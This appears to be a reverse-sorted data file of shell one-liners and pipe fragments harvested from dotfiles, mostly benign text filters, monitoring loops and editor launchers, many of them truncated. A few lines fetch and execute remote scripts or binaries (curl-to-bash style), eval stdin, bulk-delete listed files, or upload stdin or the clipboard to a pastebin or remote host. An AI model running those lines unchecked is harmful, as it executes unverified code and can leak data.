$(echo $LS | cut -d ' ' -f 1)
$(docker images -q | head -1)
$(df -h | grep mmcblk*)
$(curl -s http://${pihole}/admin/api.php?summaryRaw | sed -nE '/ads_percentage_today/{s/.*:\s*
$(curl -s http://${pihole}/admin/api.php?summaryRaw | jq)
$(curl -s http://${pihole}/admin/api.php?summaryRaw | grep -Po '
$(compgen -c | fzf)
$(compgen -ac | peco)
$(cat ~/.bash_history | fzf)
$(cat $HOME/.bash_history | fzf)
$(cat $HISTFILE | fzy -l 25)
$(brew ls macvim | grep Contents/MacOS/Vim)
$(brew list vim | grep 'bin/vim$')
$(boot2docker shellinit | grep export)
$(aws-mfa | sed `s/'//`)
$(aws ecr get-login | sed -e 's/-e none//g')
$(aws ecr get-login | awk '{print $1
$(alias ls | sed -E
$(ag . -l | fzy)
$(abspath $1) | pbcopy
$(`last_command` | fzi)
$(/opt/local/Library/Frameworks/Python.framework/Versions/2.7/bin/thefuck $(fc -ln -1 | tail -n 1)); fc -R
$($(fc -ln -1) |& tail -1)
$( cat mkgau.tmp ) |& tee mk.log; chmod o-rwx */*.o */*.exe; chgrp gaussian */*.o */*.exe; date +'%a %d %b %Y %R' &>> mk.log
$'xinput list | grep ${builtinKeyboard}'
$'system_profiler SPPowerDataType | yq \'.Power\''
$'sed -r \'/^[ \t]*(#|;)/d;/^[ \t]*$/d;\''
$'ppe \'s/<[^>]+>//g\' | pne \'print if $_ !~ /^ *$/\''
$'perl -e \'$|=1; while(<>) {$COMMAND=$_; $_=$UNDERSCORE; $RESULT=eval $COMMAND; print STDERR $@; $UNDERSCORE=$_}\''
$'kubectl get pod --no-headers | awk \'NR==1{print $1}\''
$'ip route get 8.8.8.8 | awk \'NR==1 {print $NF}\''
$'hostname -I | awk \'{print $1}\''
$'git rev-parse --abbrev-ref --symbolic-full-name @{u} | sed \'s:/.*$::\''
$'for i in `git status | awk \'/modified:/ { print $2 }\'`; do git add $i; done'
$' ${FILE_WITH_ALIAS} | wc -l)
#alias moddepgrah=lsmod | perl -e 'print "
#alias ldr=""dropbox puburl ~/Dropbox/Public/`ls -r ~/Dropbox/Public/ | head -1`""
######## lsmod|grep -q radeon && (
# | awk '{ sub(/inet6? (addr:)? ?/, \"
# for fn in `declare -F | tr -s
# docker volume ls --filter 'dangling=true' -q | xargs docker volume rm"
# docker ps -q --all | xargs docker rm ;\
# docker images | grep \"
# docker images -q --filter 'dangling=true' | xargs docker rmi;
# \\(addr:\\)\\?\\s\\?\\(\\(\\([0-9]\\+\\.\\)\\{3\\}[0-9]\\+\\)\\|[a-fA-F0-9:]\\+\\)'
# <(pacaur -Sqg base base-devel | sort) \
# && echo && ls -alhGF | grep ""^l"""
# && echo && ls -alhGF | grep ""^-"" \
"”k get events — sort-by=’.metadata.creationTimestamp’ |tail -8"""
"~/srcsearch.sh -e ""cpp|h"" --color=always -n"
"~/bin/split_dos.py $(awk ""NR==7"" CONTCAR |wc -w) $(awk ""NR==7"" CONTCAR)"
"|while read -r line; do rm ""$line""; done"
"|while read -r line; do echo \""$line\""; done"
"|vim -c ""setlocal buftype=nofile"" -"
"|stdbuf -oL -eL tee -a ""$_xsel_tmp_buf"""
"|stdbuf -oL -eL tee ""$_xsel_tmp_buf"""
"|sed -r ""s:\x1B\[[0-9;]*[mK]::g"""
"|sed -e ""s/ /\\n/g"""
"|ruby -rjson -e""puts JSON.pretty_generate(JSON.parse(gets))"""
"|python -c ""import sys;from datetime import datetime as dt;print(dt.now() - dt.fromisoformat(sys.stdin.readline().strip()))"""
"|perl -pe ""s/.[\b]//g"""
"|head
"|gvim 2>/dev/null -c ""setlocal buftype=nofile"" -"
"|grep -v ""^\s*\$"""
"|grep -v ""^[ ]*$"""
"|grep ""http://*"""
"|curl -F ""sprunge=<-"" http://sprunge.us"
"|awk ""{ print \$9 }"""
"|awk ""{ print \$8 }"""
"|awk ""{ print \$7 }"""
"|awk ""{ print \$6 }"""
"|awk ""{ print \$5 }"""
"|awk ""{ print \$4 }"""
"|awk ""{ print \$3 }"""
"|awk ""{ print \$3 \"" \"" \$2 }"""
"|awk ""{ print \$3 \"" \"" \$1 }"""
"|awk ""{ print \$2 }"""
"|awk ""{ print \$2 \"" \"" \$3 }"""
"|awk ""{ print \$2 \"" \"" \$1 }"""
"|awk ""{ print \$1 }"""
"|awk ""{ print \$1 \"" \"" \$3 }"""
"|awk ""{ print \$1 \"" \"" \$2 }"""
"|(function )?${NAME}\()"" ""$FILE"" \"
"|(function )?${NAME}( )?\()"" ""$DESKPATH"" \"
"|& vim - -c ""set ft=sh"""
"|& vim - -c ""set ft=ruby"""
"|& vim - -c ""set ft=python"""
"|& vim - -c ""set ft=perl"""
"|& vim - -c ""set ft=go"""
"|& jq ""."""
"|& ""$PAGER"" -r "
"| { eval ""$(read -d """" -r -E)"" }"
"| { eval ""$(< /dev/stdin)"" }"
"| xmessage -button okay:0,cancel:1 -default okay -file -"
"| xargs -n1 -d""\n"""
"| xargs -n1 -d ""\n"""
"| xargs -n1 -I{} -d ""\n"""
"| xargs -I % tmux send-keys -t main:0.0 ""%"" Enter"
"| vim -c ""set ft=mail"" -"
"| vim -c ""set buftype=nofile"" - "
"| vim -R ""+syntax on"" -"
"| tr -s "" """
"| tr ""\n"" "" """
"| tr "" "" ""\n"""
"| sed -u -e ""\
"| sed -r ""s/\x1B\[[0-9;]*[JKmsu]//g"""
"| sed -r ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g"""
"| sed -r ""s///"""
"| sed 's/%3a/:/gi; s/%2f/\//gi; s/[?&].*//g; s/%26/&/gi;
"| sed ""s/^.*$/\""&\""/g"""
"| pygments -f rtf ""style=monokai,fontface=Ricty"""
"| pipe_to_visual"""
"| pipe_to_editor"""
"| pipe"""
"| less --tabs=1,5 -R"
"| jq .
"| jq ""."""
"| growlnotify -s -t ""command"" -m ""finished."""
"| grep -v ""\.git"""
"| grep -c """""
"| grep -Po '[0-9]{1,4}\.[0-9]{1,4}\.[0-9]{1,4}\.[0-9]{1,4}'"
"| grep --exclude-dir={.bzr,.cvs,.git,.hg,.svn}"
"| grep --color=auto --exclude-dir={.bzr,CVS,.git,.hg,.svn}"
"| grep --color=always --exclude-dir={.bzr,CVS,.git,.hg,.svn} --exclude=\*.{o,lst,d}"
"| gnuplot -p -e ""set key bot; set term dumb 80 40; plot ${_stdin}"" "
"| egrep --color=auto -e ""$"" -e"
"| cut -d"":"" -f9"
"| cut -d"":"" -f8"
"| cut -d"":"" -f7"
"| cut -d"":"" -f6"
"| cut -d"":"" -f5"
"| cut -d"":"" -f4"
"| cut -d"":"" -f3"
"| cut -d"":"" -f2"
"| cut -d"":"" -f1"
"| cut -d"" "" -f1"
"| cut -d"" "" -f"
"| cut -d "" """
"| cut -d "" "" -f"
"| curl -F ""sprunge=<-"" http://sprunge.us"
"| curl --form ""sprunge=<-"" http://sprunge.us"
"| column -t -s "" """
"| awk -F, '{print \$9}'"
"| awk -F, '{print \$8}'"
"| awk -F, '{print \$7}'"
"| awk -F, '{print \$6}'"
"| awk -F, '{print \$5}'"
"| awk -F, '{print \$4}'"
"| awk -F, '{print \$3}'"
"| awk -F, '{print \$2}'"
"| awk -F, '{print \$1}'"
"| awk -F',' '{print $1 $2}'"
"| awk ""{print FNR \"" \"" \$0 }"""
"| awk ""{ print \$NF }"""
"| awk ""{ print \$2 }"""
"| awk ""{ print \$1 }"""
"| awk ""length < 1024 { print }"""
"| __rt__ ""\n"" "
"| /usr/bin/bat --style=""plain"""
"| $EDITOR - -c ""setl noro ma bt=nofile nowrap"""
"| ""$PAGER"" "
"| ""$(available $INTERACTIVE_FILTER)"""
"{ sw_vers; echo ""---""; xcodebuild -version; } | pbcopy"
"{ name=$(cat -); find -name $name -exec stat -c ""%y/ %n"" {} \; | sort -k1; }<<<"
"{ for f in `find -maxdepth 1 -type d`; do du -sh ""$f""; done; }|sort -h"
"{ find /etc/nginx/sites-enabled/ -type l; find /etc/nginx/conf.d/ -type f -name ""server-*.conf"" } | xargs ls -l"
"{ fc -nl -1 | sed ""s/^[[:blank:]]*//g""; }"
"{ echo ""configure""; echo ""$CMD""; echo ""commit check""; echo ""commit""; echo ""exit""; } | /usr/sbin/cli > /var/tmp/cmdoutput.tmp; cat /var/tmp/cmdoutput.tmp"
"{ cat /etc/hosts.base; sed -n '/###/,$ p' hosts/hosts-with-locals; } | sudo tee /etc/hosts"
"zx ps -eo pid,ppid,stat,etime,args | afs -o 1"
"zsh -xv |& ts ""%.S"""
"zsh -xv 2>&1 | ts -i ""%.s"" > zsh_startup.log"
"zfs list -t filesystem,snapshot,volume | grep -v storage\@"
"zfs get -o name,value used |grep @"
"zeus rspec $(git diff --name-only master..HEAD | grep -e ""^spec/.*_spec.rb$"")"
"zdump Europe/Dublin|grep ""[0-9][0-9]:[0-9][0-9]"""
"yum -Qe | cut -d "" "" -f 1 > ~/Documents/Backup\ Notes/Fedora/""$(date +""%m_%d_%Y"")_Fedora_Installed_Packages"""
"ypcat hosts | sort -t. -n -k1,1 -k2,2 -k3,3 -k4,4"
"youtube-dl -o - ""`xclip -o`"" | vlc -"
"ykman oath code ""$(ykman oath list | fzf)"""
"yes | tr ""y"" ""n"""
"yes | sudo apt update &&\
"yes | ./secrets/setup-secrets.sh -p drint-ruft-stroz-blum-niss-glass-crum-slol test && \
"yes |
"yes ""yes"" |"
"yes ""y"" | drblpush -c /etc/drbl/drblpush.conf && \
"yes ""o"" | sudo pacman -Scc"
"yes ""8=============================================================================>"" | lolcat"
"yes ""$(seq 231 -1 16)"" | while read i; do printf ""\x1b[48;5;${i}m\n""; sleep .02; done"
"yes ""$(seq 16 231)"" | while read i; do printf ""\x1b[48;5;${i}m\n""; sleep .02; done"
"yes ""$(seq 1 255)"" | while read i; do printf ""\x1b[48;5;${i}m\n""; sleep .01; done"
"yes """" | ssh-keygen -t rsa -b 4096"
"yes """" | head -n""${LINES:=100}"""
"yes """" | head -9999"
"yes """" | cpan -u"
"yay -Syu |& tee -a ~/.yay-log/seen/""$(date +%Y-%m-%d\ %H:%M:%S)"".log && xdotool key ""super+bracketright"""
"yarn application -list -appStates finished,running | grep"
"yapf . --recursive --diff --exclude=""./jenkins-*"" --style=""{based_on_style: facebook, COLUMN_LIMIT: 120, BLANK_LINE_BEFORE_NESTED_CLASS_OR_DEF: true}"" | grep ""^+++"" > reports/yapf.txt"
"yaourt -Qii | sed -n ""s/^MODIFIED\t//p"""
"yaml | sed -n ""s/.*uri: \(.*\)/\1/p""`"
"yadm ls-files -v | grep ""^[[:lower:]]"""
"yadm log -n 1 | grep -q -c ""\-\-wip\-\-"" && yadm reset HEAD~1"
"yadm log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short"
"xwininfo | grep ""id:"""
"xsetroot -solid ""#000000""| variety --resume"
"xsetroot -solid ""#000000"" | variety --pause"
"xsetbg -fullscreen -border black `find -L $HOME/Backgrounds -name ""*.*"" | randomline`"
"xrandr | grep ""HDMI1 connected"" && xrandr --output eDP1 --auto --output HDMI1 --auto --left-of eDP1"
"xrandr | command grep -o ""^[ \t]*[0-9]*x[0-9]*"" \
"xrandr | command grep -o "".* connected primary"" \
"xrandr --output eDP-1-1 --brightness $(xrandr --verbose | grep -m 1\
"xprop | sed -r -e 's/^WM_NAME\(STRING\)/name/p' -e 's/^WM_CLASS\(STRING\) = (.*), (.*)/instance = \1\nclass = \2/p' -e 'd'"
"xprop | grep WM_CLASS && echo The first part of WM_CLASS is the instance, second part is the class"
"xprop | grep -ie ""^wm_class"" -e ""^wm_name"""
"xprop | grep --ignore-case ""class"""
"xprop | grep ""WM_CLASS(STRING)"""
"xprop | grep ""WM_CLASS"""
"xprop | awk -F\"""
"xprop | awk ""/WM_CLASS/{print \$3 \$4 \$5}"""
"xprop | ack ""WM_CLASS"""
"xprop -id ""$(xwininfo | grep -oE ""0x[0-9a-f]{7}"")"""
"xmms2 list | command grep --color -C 15 ""\->"""
"xlsclients -l | grep --color=never -oxP ""(\s+Command:\s+)\K[a-zA-Z]+"""
"xinput | grep -c ""slave keyboard"""
"xflux -l 60 -g 30 -k 3200 | grep -o """
"xev | sed -ne '/^KeyPress/,/^$/p'"
"xev | grep -A2 --line-buffered '^KeyRelease' \
"xev | awk -F'[ )]+' '/^KeyPress/ { a[NR+2] } NR in a { printf %-3s %sn, $5, $8 }'"
"xev | awk -F'[ )]+' '/^KeyPress/ { a[NR+2] } NR in a { printf ""%-3s %s\n"", $5, $8 }'"
"xdpyinfo | grep ""dimensions:"""
"xdir=$(fasd -ld | fzf --tac) && cd ""$xdir"""
"xdir=$(fasd -dl | fzf --tac) && cd ""$xdir"""
"xdg-open ""`ls -t err.txt generated.file succ.txt | head -1 `"""
"xdg-open ""$(ls | shuf -n1)"""
"xdg-open ""$(ls -1t | head -1)"""
"xclip -selection clipboard"" # copy to clipboard e.g. ls | c"
"xclip -selection clipboard -o | ssh pot ""cat > .flipclip"" && echo Sent: $(xclip -selection clipboard -o)"
"xclip -selection clipboard -i <(pwd | tr -d ""\n"")"
"xargs | sed 's/ /,/g'"
"xargs | sed ""s/ /,/g"""
"xargs find | ""$GREP"""
"xargs echo -n | xclip -selection clipboard"""
"xargs -d '\\n' -a <(s --ignore-externals | \
"wordc -c ',.;()!?<>-+={}[]@#$%^*|\"
"wmsetbg --center --maxscale ""$(ls ~/.wallpapers/* | shuf -n1)"""
"wmctrl -ic $(xwininfo| sed -nE ""s/^.*Window id: (0x[0-9a-d]*).*$/\1/p"")"
"wine /etc/inexistence/02.Tools/eac3to/eac3to.exe 2>/dev/null | tr -cd ""\11\12\15\40-\176"""
"who am i | cut -f1 -d"" """
"while true;do echo ""$(date +""%F %T""): $(ls | wc -l)""; sleep 5; done"
"while true; do tput clear; date +""%H : %M"" | figlet ; sleep 1; done"
"while true; do tput clear; date +""%H : %M : %S"" | toilet -tf future ; sleep 1; done"
"while true; do tput clear; date +""%H : %M : %S"" | figlet ; sleep 1; done"
"while true; do sudo progress | grep -v ""^No ""; done"
"while true; do echo -en ""HTTP/1.1 200 OK\n\n $(date)\n"" | nc -l 127.0.0.1 8080 > /dev/null; done"
"while true; do cls; echo -n """" > adb.log; adb logcat -v audit2allow *:V | tee -a adb.log;
"while true; do clear; echo ""$(ps -ef | grep "
"while sleep 1; do echo ""Going ...""; curl -s ""http://sfci-l01.gid.gap.com:8000/invoke?operation=build&objectname=CruiseControl+Project:name=trunk-allocation-quick"" | grep Invocation; done"
"while sleep 1; do echo ""Going ...""; curl -s ""http://ft04.gid.gap.com:8000/invoke?operation=build&objectname=CruiseControl+Project:name=trunk-allocation.isolated.functional-test"" | grep Invocation; done"
"while read pkg;do pip3 install --user -U ""$pkg"";done <<<$(sudo pip3 freeze | cut -d"
"while read line; do echo ""$(date +%Y-%m-%dT%H:%M:%S.$( date +%N | sed "
"while read command percent rss; do if [[ ""${command}"" != ""COMMAND"" ]]; then rss=""$(bc <<< ""scale=2;${rss}/1024"")""; fi; printf ""%-26s%-8s%s\n"" ""${command}"" ""${percent}"" ""${rss}""; done < <(ps -A --sort -rss -o comm,pmem,rss | head -n 11)"
"while :;do for s in / - \\ \|; do printf ""\r$s"";sleep .1;done;done"
"while :; do ps -eo pid,ni,pri,pcpu,psr,comm | grep ""mysql""; sleep 1; done"
"while :; do ps -eo pid,ni,pri,pcpu,psr,comm | grep ""apache""; sleep 1; done"
"while :; do PRINT=`__da`; echo ""$PRINT"" ; tput setaf 7; display_center | tr "
"while ( svcs -o STATE nvOSd | egrep ""offline"" ) ; do sleep 2; done ; sts"
"while ( sts | egrep ""offline"" ) ; do sleep 2; done ; sts"
"while ! galileo --bluetooth PyDBUS --database RemoteRESTDatabase --no-https-only --debug | grep ""Synchronisation successful"" ; do : ; done"
"whatis ""$(fc -nl -1 | awk ""{print \$NF}"")"""
"wget http://ipinfo.io/ip -qO - | tr ""\n"" "" """
"wget http://checkip.dyndns.org/ -O - -o /dev/null | perl -e '<STDIN> =~ m/((\d{1,3}\.){3}\d{1,3})/ && print \"
"wget http://checkip.dyndns.org/ -O - -o /dev/null | grep -Eo ""([0-9]+\.?){4}"""
"wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/$(get_latest_release ""nvm-sh/nvm"")/install.sh | bash"
"wget -qO /dev/null http://localhost:$(lsof -nPc emhttp | grep -Po ""TCP[^\d]*\K\d+"")/update.htm?cmdStop=Stop"
"wget -qO /dev/null http://localhost:$(lsof -nPc emhttp | grep -Po ""TCP[^\d]*\K\d+"")/update.htm?cmdStart=Start"
"wget -qO - http://www.commandlinefu.com/commands/random/plaintext | sed -n ""1d; /./p"""
"wget -qO - http://myip.dk/ | egrep -m1 -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'"
"wget -qO - ""https://source.unsplash.com/random/1920x1080"" | feh --bg-center -"
"wget -q http://www.luft.co.jp/cgi/ipcheck.php -O - |grep ""name=\""IP\"""""
"wget -q http://dras.hu/wiki/tudasbazis/linux/tmux --header=""X-DokuWiki-Do: export_xhtmlbody"" -O - | elinks -force-html"
"wget -q -O - http://www.whatismyip.org | grep ""Your IP"""
"wget -q -O - checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'"""
"wget -q -O - checkip.dyndns.org | sed -e ""s/.*Current IP Address: //"" -e ""s/<.*$//"""
"wget -O - https://raw.githubusercontent.com/robertknight/konsole/master/tests/color-spaces.pl | perl; \
"wget -O - http://liis.ro/hosted/activitati/2013/laboratoare/labs.pdf | \
"wget --no-cache -qO precise ""https://gist.githubusercontent.com/jameswhite/5ef1524e5d99904a0e65/raw/precise""; MD5=$(md5sum precise | cut -b 1-32); echo $MD5 ; chmod 755 precise ; ./precise"
"weather -l ""Rochester Hills, Michigan"" -d 2 | less"
"weather -l ""Pontiac, Michigan"" -d 2 | less"
"wc -l | cut -d"" "" -f1"
"wc -l `find . -iname ""*.scss""` | sort -n"
"wc -l `find . -iname ""*.php""` | sort -n"
"wc -l `find . -iname ""*.js""` | sort -n"
"wc -l `find . -iname ""*.html""` | sort -n"
"wc -l **/*.{hpp,cpp} | tail -n 1"
"wc -l $(git ls-files | grep "".*\.rb"")"
"wc -l $(git ls-files | grep "".*\.js"")"
"wc -l $(git ls-files | grep "".*\.java"")"
"wc -l $(find . -name ""*.py"" | xargs) Procfile *.sh"
"watchmem #'watch -n 0.1 '\''ps aux | awk ""{print $2, $4, $11}""'\'''"
"watch -tn1 ""lscpu | grep MHz; printf "
"watch -tn 1 ""date +%H:%M:%S | toilet"""
"watch -tc ""dmesg | tail -$(tput lines)"""
"watch -t -n1 ""date +%T|figlet"""
"watch -t -n1 ""date +%T|figlet -f big"""
"watch -t -n1 ""date +%T| figlet"""
"watch -t -n.01 ""gdate +%s.%6N | figlet -f tinker-toy"""
"watch -t -n.01 ""gdate +%s.%6N | figlet -f banner"""
"watch -t -c -n1 ""date +%T|toilet --gay"""
"watch -n30 ""ps -xrU elbayadm | grep yaml"""
"watch -n2 ""docker-compose logs | tail -f"""
"watch -n10 ""iputility eth0 | sort"""
"watch -n1 ""sensors|grep --color=never C"""
"watch -n1 ""qstat|tail -n 30"""
"watch -n1 ""ps aux --sort=-pcpu | head -n 6"""
"watch -n1 ""ifconfig | grep RX"""
"watch -n1 ""find . -type f -print | wc -l"""
"watch -n1 ""echo \""obase=2;\$(date +%s)\"" | bc"""
"watch -n1 ""dmesg|tail -n20"""
"watch -n1 ""dmesg | tail -n 20"""
"watch -n1 ""dmesg --human | tail -n $((`tput lines`-5))"""
"watch -n1 ""cat /proc/cpuinfo | grep \""^[c]pu MHz\"""""
"watch -n1 ""cat /proc/cpuinfo | grep -e \""core id\"" -e \""cpu MHz\"""""
"watch -n1 ""cat /proc/cpuinfo | grep ""MHz"""""
"watch -n0.5 -t ""vnstat -d -i eth0+usb0+bnep0|grep -v \""\-\-\"""""
"watch -n.1 ""cat /proc/cpuinfo | grep \""^[c]pu MHz\"""""
"watch -n 5 ""curl -s \""http://elasticsearch.internal.carlosedp.com/_cat/nodes?v&s=name\""; echo \""\n\""; curl -s \""http://elasticsearch.internal.carlosedp.com/_cat/indices?v&s=index:desc\""|head -30"""
"watch -n 3600 ""fortune -s | cowsay"""
"watch -n 3 ""free; echo; uptime; echo; ps aux --sort=-%cpu | head -n 11; echo; who"""
"watch -n 1 'ps -e -o pid,uname,cmd,pmem,pcpu --sort=-pmem,-pcpu | head -15'"
"watch -n 1 ""sudo netstat -tpanl | grep ESTABLISHED"""
"watch -n 1 ""ps -e -o pid,user,command,etime,xstat,pmem,pcpu -r | head -n 15"""
"watch -n 1 ""ps -e -o pid,user,command,etime,xstat,pmem,pcpu -m | head -n 15"""
"watch -n 1 ""mysql -uroot -e \""show processlist;\"" | wc -l"""
"watch -n 1 ""kubectl get po | grep autofill"""
"watch -n 1 ""ifconfig wlp2s0 | grep bytes"""
"watch -n 1 ""df -h | grep /dev/disk1"""
"watch -n 1 ""date +%T | xargs figlet \""Time:\"" -c -t"""
"watch -n 1 ""cat /proc/meminfo | grep Dirty"""
"watch -n 1 ""cat /proc/cpuinfo | grep \""^cpu MHz\"""""
"watch -n 1 ""cat /proc/acpi/ibm/fan|egrep "
"watch -n 1 ""/sbin/ifconfig eth0 | grep bytes"""
"watch -n 0.5 -t ""cat /proc/cpuinfo | grep MHz"""
"watch -n 0.5 ""bjobs -o \""id:8 queue:13 stat:5 submit_time:15 exec_host:15 name:40 sub_cwd\"" | sort -r"""
"watch -n 0.1 ""dmesg | tail -n $((LINES-6))"""
"watch -n 0.1 ""cpufreq-info | grep frequency\ is"""
"watch -n 0,3 ""cat /proc/cpuinfo | grep MHz"""
"watch -n 0 -c ""dmesg --color=always | tail --lines 30"""
"watch -n 0 ""sensors | grep Core"""
"watch -n 0 ""lscpu | grep MHz"""
"watch -n 0 ""lscpu | grep "
"watch -d -n 30 ""echo """"; squeue -u tin --start --long ; squeue -u tin --long; echo """" ; wc iolog_000.out ; ls -ltr *nc iolog_000.out; echo """"; grep Walltime iolog_000.out | tac """
"watch -d ""free -m;echo;ps aux --sort -rss | head -11"""
"watch -c ""kubectl get pods | clog kubectl"" "
"watch --differences=cumulative ""netstat -s -u | grep \""receive errors\"""""
"watch ""sensors | grep Core"""
"watch ""ps -ajx | grep \""php app/console\"""""
"watch ""ls -l|tail -n 40"""
"watch ""ls -ltr|tail -n 40"""
"watch ""ls -lth |head -20"""
"watch ""ls -lrt | tail -10"""
"watch ""ls -1 | wc -l"""
"watch ""ls $OPSVIEW_BASE/var/ndologs | wc -l ; ls -la $OPSVIEW_BASE/var/ndologs/"""
"watch ""kubectl get pod | rg sanbase"""
"watch ""journalctl | tail -n 20"""
"watch ""ip a | grep enp -A 2"""
"watch ""fetch_servers.py -c ~/.knewton/services/authentication_production.yml | column -t"""
"watch ""fetch_builds.py -c ~/.knewton/services/authentication_production.yml | column -t"""
"watch ""echo stats | nc 127.0.0.1 11211"""
"watch ""du -hs err.txt generated.file succ.txt | sort -h"""
"watch ""dmesg | tail -n50"""
"watch ""dmesg | tail -n 20"""
"watch ""dmesg | tail -20"""
"watch ""/usr/bin/iostat | cat - /proc/mdstat"""
"w3m ""http://eow.alc.co.jp/function/UTF-8/?ref=sa"" | less +37"
"vzlist -ao ctid,status,name,ip | sed 's/^.*running.*$/\x1b[32m\0\x1b(B\x1b[m/'"
"vzlist -ao ctid,status,name,hostname | sed 's/^.*running.*$/\x1b[32m\0\x1b(B\x1b[m/'"
"vultr servers | awk ""{printf \""%-8s %-32s %-16s\n\"", \$1, \$4, \$3}"""
"vtysh -c ""show ip route"" | grep inactive "
"vs-tools ""$2}' |sed -e ""s/=/=\'/g ; s/$/\'/g"">> /root/.vs-shellrc"
"vrun ""dpkg -l | grep continuum"""
"vr ""echo flush_all | nc localhost 11211"""
"vox-run bash -c ""find server/voxsup -name \""*.py\"" | xargs pylint -f parseable --rcfile=./.pylintrc"""
"vmrun getGuestIPAddress ""$(vmrun list | tail -1)"""
"vm_stat\ \|\ perl\ \-ne\ \'\/page\ size\ of\ \(\\d\+\)\/\ and\ \$size\=\$1\;\ \/Pages\\s\+\(\[\^\:\]\+\)\[\^\\d\]\+\(\\d\+\)\/\ and\ printf\(\""\%\-16s\ \%\ 16\.2f\ Mi\\n\""\,\ \""\$1\:\""\,\ \$2\ \*\ \$size\ \/\ 1048576\)\;\'"
"vm_stat | perl -ne '/page size of (\d+)/ and \$size=\$1; \
"vlc -f $(find /mnt/gdrive/tdrive/movies/ -type f -iname ""*.mkv"" | fzf )"
"virtualenv --no-site-packages --prompt=\(venv:$(pwd|sed ""s/.*\///"")\) venv/; source venv/bin/activate"
"vimfunc(){set -x ; echo $1 ; if [[ ""$1"" =~ ^.*:([[:digit:]]).* ]]; then var=`echo ""$1"" | sed ""s/:\([[:digit:]]\)/ +\1/g"" `; echo ""${var}"" ; vim ${var} ; else echo ""$*"" ; vim ""$*"" ; fi ; set +x } ; vimfunc"
"vimfunc(){ set -x ; echo 1:$1 2:$2 ; if [ -z ""$2"" ]; then if [[ ""$1"" =~ ^.*:([[:digit:]]).* ]]; then var=`echo ""$1"" | sed ""s/:\([[:digit:]]\)/ +\1/g"" `; echo ""${var}"" ; vim ${var} ; else echo ""$*"" ; vim $* ; fi ; else vim $* ; fi; set +x } ; vimfunc"
"vimfunc(){ if [ -z ""$2"" ]; then if [[ ""$1"" =~ ^.*:([[:digit:]]).* ]]; then var=`echo ""$1"" | sed ""s/:\([[:digit:]]\)/ +\1/g"" `; vim ${var} ; else vim $* ; fi ; else vim $* ; fi; } ; vimfunc"
"vim=""eval $(type _vimserver | tail -n +2); _vimserver"" v -l"
"vim ~/util/scratch +1 -c "":r!xclip -o"";cat ~/util/scratch |xclip -i"
"vim `git status --porcelain | cut -d "" "" -f 3`"
"vim `git ls-files | peco --prompt ""VIM OPEN FILE>""`"
"vim `git diff origin/devel... --name-only --relative -- ""*.js"" | fzf`"
"vim `find . -name ""*"" | peco --prompt ""VIM OPEN FILE>""`"
"vim `find -name ""*.swp"" | python -c ""import sys; import re; print(\""\n\"".join([\""\"".join(re.match(\""(\.[^\.]*).(.*).swp\"",x).groups()) for x in sys.stdin.read().splitlines()]))""`"
"vim -p $(find . -name .\*.sw? | sed -e ""s/\/\.\(.*\)\.sw.$/\/\1/g"")"
"vim -e -c ""helptags . | quit"""
"vim -c ""silent! call dein#update() | Capture Dein log"""
"vim -c ""silent file stdin | set nomodified"" -"
"vim -c ""set spell | set buftype=nofile"""
"vim -c ""he|on"""
"vim -c ""help|only"""
"vim -c ""colorscheme molokai | Note config"""
"vim -c ""cd ~/Documents | set ft=markdown"""
"vim -c ""call pathogen#helptags()|q"""
"vim -c ""PlugInstall|qall!"""
"vim -c ""NERDTree | call NERDTreeToggleWidth()"""
"vim -c "":map"" -c "":q"" | less -R"
"vim -c "":help | only"""
"vim -X `find -type f -name ""*py""|sort`"
"vim -O $(git s | awk ""{print \$2}"")"
"vim --version | sed -rn '1,3p;4s/^([^.]+)(\..*)$/\1/p'"
"vim --cmd ""set errorformat=%m\ \#\ %f:%l"" -q <( bundle exec cucumber --dry-run --format=usage | grep -B1 -i ""not matched by any steps"" )"
"vim +/""<<<<<<<"" $( git diff --name-only --diff-filter=U | xargs )"
"vim +""set hlsearch"" +""/^[<=>]\{7\}/\( \|$\)"" $(gkl)"
"vim + ~/Dropbox/journal/$(date +%Y)/$(date +%Y%m%d).md -c ""execute \""normal! Go\<CR>$(date +%T)\<CR>========\<CR>\"" | startinsert """
"vim $(git status -s | grep -Po ""(?<=^[ A-Z?][ A-Z?] ).*$"")"
"vim $(git status --short | sed -ne ""s/^ *UU //p"")"
"vim $(git status --short | sed -ne ""s/^ *M //p"")"
"vim $(git status --short | awk "" { print $2 } "")"
"vim $(git status --porcelain | sed -ne ""s/^ M //p"")"
"vim $(git diff --name-only | tr ""\n"" "" "")"
"vim $(git diff --name-only --diff-filter=U | tr ""\n"" "" "")"
"vim $(fzf_grep | sed -e ""s/:/ +/"")"
"vim $(app/console doctrine:migrations:diff | cut -d""\"""" -f2)"
"vim $(ack -l ""$1"" | head -1)"
"vim ""+tab Man zshall | normal
"vim ""+copen | cfile /usr/tmp/"
"vim ""$(ls -t | head -1)"""
"vim ""$(git ls-files | fzf)"""
"viewnior ""$MPD_DIR""/""$(dirname ""$(mpc -f %file% | head -n 1)"")""/cover"
"vi +""set nu | set ic"""
"vi $(gdf | grep $(pwd)) -c "":BufExplorer"""
"vi $(find . -path ""./.git*"" -prune -o -print | peco)"
"vi $(find . -name ""*.py"" | grep -v ""__init__.py"")"
"vi ""$(rg -g ""!*vendor/*"" -l . | fzf --height=100% --preview="
"vi ""$(ls -dtr1 ~/.yay-log/* | tail -1)"""
"vcgencmd measure_temp | sed -e ""s/temp=//g"""
"vcgencmd measure_temp | grep -o -E ""[0-9\\.]+"""
"vboxmanage list vms --long | grep -e ""Name:"" -e ""State:"""
"vagrant status | grep -v ""not created"""
"vagrant ssh -c ""php -i | grep xdebug.support"""
"v $(g status -suno --porcelain|awk ""{print \$2}"")"
"uuidgen | tr ""[a-z]"" ""[A-Z]"""
"uuidgen | tr ""[A-Z]"" ""[a-z]"""
"uuidgen | tr ""[:upper:]"" ""[:lower:]"""
"uuidgen | tr ""[:lower:]"" ""[:upper:]"""
"uuidgen | awk ""{print tolower($1)}"""
"usshfs; mkdir -p /tmp/sshfs; for host in $(grep ""Host "" ~/.ssh/config | cut -d "" "" -f 2); do mkdir -p /tmp/sshfs/$host; ( ( sshfs $host: /tmp/sshfs/$host 2>/dev/null && ln -s /tmp/sshfs/$host $host ) & ); done"
"urxvt -fn ""xft:Hack:size=16"" -geometry 80x25 -e adom&|"
